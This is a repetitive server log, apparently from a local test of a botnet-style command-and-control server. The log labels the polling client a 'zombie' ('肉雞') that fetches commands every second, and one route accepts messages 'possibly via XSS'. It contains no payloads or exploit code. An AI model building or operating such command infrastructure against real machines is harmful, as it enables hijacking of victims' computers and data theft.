2025-06-25 00:05:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:21 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:21] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:22 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:22 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:22 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:22] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:23 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:23 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:23 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:23] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:24 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:24 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:24 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:24] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:25 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:25 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:25 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:25] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:26 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:26 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:26 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:26] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:27 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:27 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:27 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:27 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:27] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:28 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:28 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:28 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:28] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:29 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:29 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:29 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:29] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:30 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:30 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:30 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:30 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:30] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:31 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:31] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:32 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:32 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:32 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:32] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:33 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:33 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:33 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:33] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:34 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:34 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:34 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:34 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:34] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:35 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:35 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:35 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:35] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:36 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:36] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:37 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:37 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:37 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:37] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:38 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:38 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:38 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:38] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:39 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:39 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:39 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:39 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:39] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:40 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:40 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:40 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:40] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:41 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:41] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:42 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:42 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:42 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:42] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:43 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:43 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:43 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:43] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:44 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:44 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:44 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:44] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:45 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:45] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:46 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:46 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:46 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:46] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:47 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:47 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:47 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:47] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:48 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:48 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:48 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:48] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:49 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:49 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:49 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:49 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:49] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:50 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:50] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-25 00:05:50 | INFO     | control_route.py:26 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-25 00:05:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0001s) -> 回傳: (<Response 164 bytes [200 OK]>, 400)
2025-06-25 00:05:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:50] "[31m[1mGET /api/control/add_message HTTP/1.1[0m" 400 -
2025-06-25 00:05:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:50] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-25 00:05:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:50] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
2025-06-25 00:05:51 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:51 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:51 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:51] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:52 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:52 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:52 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:52 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:52] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:53 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:53 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:53 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:53] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:54 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:54 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:54 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:54] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:55 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:55 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:55 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:55] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:56 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:56 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:56 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:56] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:57 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:57 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:57 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:57 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:57] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:58 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:58 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:58 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:58 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:58] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:05:59 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:05:59 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:05:59 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:05:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:05:59] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:06:00 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:06:00 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:06:00 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:06:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:06:00] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:06:01 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:06:01 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:06:01 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:06:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:06:01] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:06:02 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:06:02 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:06:02 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:06:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:06:02] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:06:03 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:06:03 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:06:03 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:06:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:06:03] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:06:04 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:06:04 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:06:04 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:06:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:06:04] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:06:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:06:05 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:06:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:06:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:06:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:06:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:06:20 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:06:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:06:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:06:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:07:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:07:20 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:07:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:07:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:07:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:07:57 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:07:57 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:07:57 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:07:57 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:07:57] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:07:58 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:07:58 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:07:58 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:07:58 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:07:58] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:00 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:08:00 | INFO     | control_route.py:157 | get_command() | 肉雞請求獲取命令
2025-06-25 00:08:00 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:08:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:08:00] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:08:01 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
